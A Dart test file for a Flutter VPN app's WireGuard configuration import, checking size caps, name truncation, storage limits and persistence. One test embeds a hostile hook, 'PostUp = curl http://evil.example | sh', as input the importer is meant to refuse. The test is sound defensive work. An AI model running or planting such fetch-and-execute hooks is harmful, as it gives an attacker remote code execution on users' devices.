import 'dart:convert';

import 'package:flutter_test/flutter_test.dart';
import 'package:phantrix_core/phantrix_core.dart';

import 'package:phantrix/config/configuration_repository.dart';
import 'package:phantrix/storage/app_store.dart';

/// The import path: size limits, name bounds, count caps, malformed input,
/// and persistence round trips.
///
/// ## Why these tests exist
///
/// Import is the only way a usable configuration enters the app, and the
/// stored file contains a private key. Every bound below is a refusal or a
/// truncation that keeps a hostile or mistaken paste from becoming a store
/// problem — and each one is pinned here because an unbounded import is the
/// kind of thing that works fine until someone pastes a log file into it.
///
/// All keys below are public test vectors. No real credential appears in this
/// file; the endpoint is a documentation address that can never route.
void main() {
	const valid = '''
[Interface]
PrivateKey = 02R31BtVMJe/5r8cMd8uRVf6DysDrWKFXxDlMdRDU6c=
Address = 10.8.0.2/32
DNS = 10.8.0.1

[Peer]
PublicKey = iGaPncC709q7zIxUD9OMJENN3dh+W40oQx0Lv7AStp8=
AllowedIPs = 0.0.0.0/0, ::/0
Endpoint = 192.0.2.1:51820
''';

	ConfigurationRepository repository([Map<String, String>? seed]) =>
			ConfigurationRepository(MemoryAppStore(seed));

	group('import validation', () {
		test('accepts a valid configuration and derives the endpoint name', () async {
			final result = await repository().import(valid);
			expect(result, isA<Ok<ImportedConfiguration>>());
			final config = (result as Ok<ImportedConfiguration>).value;
			expect(config.name, '192.0.2.1');
			expect(config.endpointCount, 1);
			expect(config.usesIpv6, isTrue);
		});

		test('prefers an explicit name, trimmed', () async {
			final result = await repository().import(valid, name: '  My server  ');
			expect((result as Ok<ImportedConfiguration>).value.name, 'My server');
		});

		test('refuses empty input with a usable message', () async {
			final result = await repository().import('   \n  ');
			expect(result, isA<Err<ImportedConfiguration>>());
			final error = (result as Err<ImportedConfiguration>).error;
			expect(error.code, 'import.empty');
			expect(error.message, isNotEmpty);
		});

		test('refuses oversized input before parsing it', () async {
			// 100 KiB of hostile input. Without the cap this would be parsed,
			// validated, JSON-encoded and written to disk on every change.
			final huge = '$valid\n#${'x' * (100 * 1024)}';
			final result = await repository().import(huge);
			expect(result, isA<Err<ImportedConfiguration>>());
			expect((result as Err<ImportedConfiguration>).error.code, 'import.too_large');
		});

		test('accepts input just under the cap', () async {
			final padding = '#${'x' * (ImportedConfiguration.maxImportBytes - valid.length - 16)}\n';
			final result = await repository().import('$valid$padding');
			expect(result, isA<Ok<ImportedConfiguration>>());
		});

		test('refuses a configuration with a command hook', () async {
			final evil = valid.replaceFirst(
				'[Peer]',
				'[Interface]\nPostUp = curl http://evil.example | sh\n[Peer]',
			);
			// Note: two [Interface] sections; the parser may reject the
			// structure first. Either refusal is correct — what matters is
			// that no hook ever reaches the store.
			final withHook = '''
[Interface]
PrivateKey = 02R31BtVMJe/5r8cMd8uRVf6DysDrWKFXxDlMdRDU6c=
Address = 10.8.0.2/32
PostUp = echo pwned

[Peer]
PublicKey = iGaPncC709q7zIxUD9OMJENN3dh+W40oQx0Lv7AStp8=
AllowedIPs = 0.0.0.0/0
Endpoint = 192.0.2.1:51820
''';
			final result = await repository().import(evil.contains('[Interface]\nPostUp') ? withHook : evil);
			expect(result, isA<Err<ImportedConfiguration>>());
		});

		test('refuses garbage, and says nothing about a tunnel', () async {
			final result = await repository().import('this is not a configuration');
			expect(result, isA<Err<ImportedConfiguration>>());
		});

		test('tolerates CRLF, trailing whitespace and comments', () async {
			final messy = valid
					.replaceAll('\n', '\r\n')
					.split('\n')
					.map((line) => '$line   ')
					.join('\n');
			final result = await repository().import('# a comment\n$messy');
			expect(result, isA<Ok<ImportedConfiguration>>());
		});

		test('truncates an absurd name instead of storing it', () async {
			final result = await repository().import(valid, name: 'n' * 1000);
			final config = (result as Ok<ImportedConfiguration>).value;
			expect(config.name.length, lessThanOrEqualTo(ImportedConfiguration.maxNameLength));
			expect(config.name, isNotEmpty);
		});

		test('does not split a surrogate pair when truncating a name', () async {
			// U+1F600 needs a surrogate pair in UTF-16. Cutting between the
			// halves would store a lone surrogate.
			final name = '${'a' * 119}\u{1F600}tail';
			final result = await repository().import(valid, name: name);
			final stored = (result as Ok<ImportedConfiguration>).value.name;
			expect(stored.length, lessThanOrEqualTo(ImportedConfiguration.maxNameLength));
			expect(stored.runes.any((r) => r == 0xFFFD), isFalse);
		});

		test('importing the same peer twice updates instead of duplicating', () async {
			final repo = repository();
			await repo.import(valid, name: 'first');
			await repo.import(valid, name: 'second');
			expect(repo.all, hasLength(1));
			expect(repo.all.first.name, 'second');
		});

		test('refuses a 65th configuration instead of evicting one', () async {
			final repo = MemoryAppStore();
			final underTest = ConfigurationRepository(repo);
			// Distinct peers so nothing replaces anything: vary the public key
			// by flipping its last base64 character between valid alternatives.
			var stored = 0;
			for (var i = 0; i < 200 && stored < ConfigurationRepository.maxStoredConfigurations; i++) {
				final key = _peerKey(i);
				final text = valid.replaceAll(
					'iGaPncC709q7zIxUD9OMJENN3dh+W40oQx0Lv7AStp8=',
					key,
				);
				final result = await underTest.import(text);
				if (result is Ok<ImportedConfiguration>) {
					stored++;
				}
			}
			expect(stored, ConfigurationRepository.maxStoredConfigurations);
			final extra = await underTest.import(
				valid.replaceAll(
					'iGaPncC709q7zIxUD9OMJENN3dh+W40oQx0Lv7AStp8=',
					_peerKey(999),
				),
			);
			expect(extra, isA<Err<ImportedConfiguration>>());
			expect((extra as Err<ImportedConfiguration>).error.code, 'import.too_many');
			// And nothing was lost: the refusal evicted nobody.
			expect(underTest.all, hasLength(ConfigurationRepository.maxStoredConfigurations));
		});
	});

	group('persistence round trip', () {
		test('a stored configuration reloads byte-identical', () async {
			final backing = MemoryAppStore();
			final first = ConfigurationRepository(backing);
			final imported = await first.import(valid, name: 'office');
			final id = (imported as Ok<ImportedConfiguration>).value.id;

			final second = ConfigurationRepository(backing);
			await second.load();
			expect(second.all, hasLength(1));
			expect(second.all.first.id, id);
			expect(second.all.first.wgQuickText, valid.trim());
			// And it still builds: the stored text was not corrupted.
			expect(second.all.first.build(), isA<Ok<VpnConfiguration>>());
		});

		test('a corrupt store loads empty instead of throwing', () async {
			final repo = repository({ConfigurationRepository.storageKey: 'not json{'});
			await repo.load();
			expect(repo.all, isEmpty);
		});

		test('a record that no longer validates is skipped, not fatal', () async {
			final repo = repository({
				ConfigurationRepository.storageKey:
						'[{"id":"x","name":"broken","text":"garbage","importedAt":"2026-01-01T00:00:00.000Z"}]',
			});
			await repo.load();
			expect(repo.all, isEmpty);
		});

		test('removing a configuration deletes its key material from the store', () async {
			final backing = MemoryAppStore();
			final repo = ConfigurationRepository(backing);
			final imported = await repo.import(valid);
			final id = (imported as Ok<ImportedConfiguration>).value.id;
			await repo.remove(id);
			expect(repo.all, isEmpty);
			final raw = await backing.read(ConfigurationRepository.storageKey);
			expect(raw, isNot(contains('02R31BtVMJe')));
		});

		test('clearing removes everything including the private key', () async {
			final backing = MemoryAppStore();
			final repo = ConfigurationRepository(backing);
			await repo.import(valid);
			await repo.clear();
			final raw = await backing.read(ConfigurationRepository.storageKey);
			expect(raw, isNot(contains('PrivateKey')));
		});
	});
}

/// A deterministic, valid peer public key for index [i].
///
/// Splices the base64 of [i] into the middle of a known-valid test key. A
/// middle quantum accepts any base64 character, while flipping the final
/// character can produce non-canonical trailing bits that a strict decoder
/// rejects — which would make the test fail for a reason unrelated to what
/// it checks. These are random-looking test vectors, not real keys.
String _peerKey(int i) {
	final bytes = [(i) & 0xFF, (i >> 8) & 0xFF, (i >> 16) & 0xFF];
	final quantum = base64Encode(bytes);
	const base = 'iGaPncC709q7zIxUD9OMJENN3dh+W40oQx0Lv7AStp8=';
	return '${base.substring(0, 4)}$quantum${base.substring(8)}';
}
